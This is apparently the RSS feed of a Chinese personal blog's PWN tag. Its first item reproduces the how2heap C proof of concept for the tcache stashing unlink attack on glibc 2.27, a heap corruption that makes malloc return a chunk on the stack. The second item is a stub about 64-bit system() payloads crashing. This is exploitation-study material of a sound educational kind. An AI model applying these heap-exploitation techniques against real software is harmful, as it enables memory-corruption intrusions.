<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>PWN - 标签 - 敬渊&#39;s Blog</title>
    <link>http://localhost:1313/tags/pwn/</link>
    <description>敬渊&#39;s Blog</description>
    <generator>Hugo 0.154.5 &amp; FixIt v0.4.3-20260123080729-2a5bd268</generator>
    <language>zh-CN</language>
    <lastBuildDate>Wed, 01 Sep 2021 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Tcache_stashing_unlink_atack调试记录</title>
      <link>http://localhost:1313/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</link>
      <pubDate>Wed, 01 Sep 2021 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</guid>
      <category domain="http://localhost:1313/categories/technology/">Technology</category>
      <description>&lt;p&gt;代码是how2heap中libc2.27的代码&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;##include &amp;lt;stdio.h&amp;gt;&#xA;##include &amp;lt;stdlib.h&amp;gt;&#xA;##include &amp;lt;assert.h&amp;gt;&#xA;&#xA;int main(){&#xA;    unsigned long stack_var[0x10] = {0};&#xA;    unsigned long *chunk_lis[0x10] = {0};&#xA;    unsigned long *target;&#xA;&#xA;    setbuf(stdout, NULL);&#xA;&#xA;    printf(&amp;#34;This file demonstrates the stashing unlink attack on tcache.\n\n&amp;#34;);&#xA;    printf(&amp;#34;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&amp;#34;);&#xA;    printf(&amp;#34;This technique can be used when you are able to overwrite the victim-&amp;gt;bk pointer. Besides, it&amp;#39;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&amp;#34;);&#xA;    printf(&amp;#34;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&amp;#34;);&#xA;    printf(&amp;#34;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&amp;#39;ll create the chunk on the stack.\n\n&amp;#34;);&#xA;&#xA;    // stack_var emulate the fake_chunk we want to alloc to&#xA;    printf(&amp;#34;Stack_var emulates the fake chunk we want to alloc to.\n\n&amp;#34;);&#xA;    printf(&amp;#34;First let&amp;#39;s write a writeable address to fake_chunk-&amp;gt;bk to bypass bck-&amp;gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&amp;gt;bk &amp;#43; 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&amp;#34;);&#xA;&#xA;    stack_var[3] = (unsigned long)(&amp;amp;stack_var[2]);&#xA;&#xA;    printf(&amp;#34;You can see the value of fake_chunk-&amp;gt;bk is:%p\n\n&amp;#34;,(void*)stack_var[3]);&#xA;    printf(&amp;#34;Also, let&amp;#39;s see the initial value of stack_var[4]:%p\n\n&amp;#34;,(void*)stack_var[4]);&#xA;    printf(&amp;#34;Now we alloc 9 chunks with malloc.\n\n&amp;#34;);&#xA;&#xA;    //now we malloc 9 chunks&#xA;    for(int i = 0;i &amp;lt; 9;i&amp;#43;&amp;#43;){&#xA;        chunk_lis[i] = (unsigned long*)malloc(0x90);&#xA;    }&#xA;&#xA;    //put 7 chunks into tcache&#xA;    printf(&amp;#34;Then we free 7 of them in order to put them into tcache. Carefully we didn&amp;#39;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&amp;#34;);&#xA;&#xA;    for(int i = 3;i &amp;lt; 9;i&amp;#43;&amp;#43;){&#xA;        free(chunk_lis[i]);&#xA;    }&#xA;&#xA;    printf(&amp;#34;As you can see, chunk1 &amp;amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&amp;#34;);&#xA;&#xA;    //last tcache bin&#xA;    free(chunk_lis[1]);&#xA;    //now they are put into unsorted bin&#xA;    free(chunk_lis[0]);&#xA;    free(chunk_lis[2]);&#xA;&#xA;    //convert into small bin&#xA;    printf(&amp;#34;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&amp;#34;);&#xA;&#xA;    malloc(0xa0);// size &amp;gt; 0x90&#xA;&#xA;    //now 5 tcache bins&#xA;    printf(&amp;#34;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&amp;#34;);&#xA;&#xA;    malloc(0x90);&#xA;    malloc(0x90);&#xA;&#xA;    printf(&amp;#34;Now we emulate a vulnerability that can overwrite the victim-&amp;gt;bk pointer into fake_chunk addr: %p.\n\n&amp;#34;,(void*)stack_var);&#xA;&#xA;    //change victim-&amp;gt;bck&#xA;    /*VULNERABILITY*/&#xA;    chunk_lis[2][1] = (unsigned long)stack_var;&#xA;    /*VULNERABILITY*/&#xA;&#xA;    //trigger the attack&#xA;    printf(&amp;#34;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&amp;#34;);&#xA;&#xA;    calloc(1,0x90);&#xA;&#xA;    printf(&amp;#34;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&amp;gt;fd has been changed into a libc addr: %p\n\n&amp;#34;,(void*)stack_var[2],(void*)stack_var[4]);&#xA;&#xA;    //malloc and return our fake chunk on stack&#xA;    target = malloc(0x90);   &#xA;&#xA;    printf(&amp;#34;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&amp;#34;,(void*)target);&#xA;&#xA;    assert(target == &amp;amp;stack_var[2]);&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么就开始调试吧：&lt;/p&gt;</description>
    </item>
    <item>
      <title>在64位的glibc上payload调用system导致crash的问题</title>
      <link>http://localhost:1313/posts/64%E4%BD%8Dpayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</link>
      <pubDate>Thu, 08 Apr 2021 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/64%E4%BD%8Dpayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</guid>
      <category domain="http://localhost:1313/categories/technology/">Technology</category>
      <description>&lt;p&gt;[TOC]&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;在64位的glibc上payload调用system导致crash的问题&#34;&gt;&lt;span&gt;在64位的glibc上payload调用system导致crash的问题&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%9c%a864%e4%bd%8d%e7%9a%84glibc%e4%b8%8apayload%e8%b0%83%e7%94%a8system%e5%af%bc%e8%87%b4crash%e7%9a%84%e9%97%ae%e9%a2%98&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;在一些64位的pwn题中，调用system后会导致程序crash掉&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
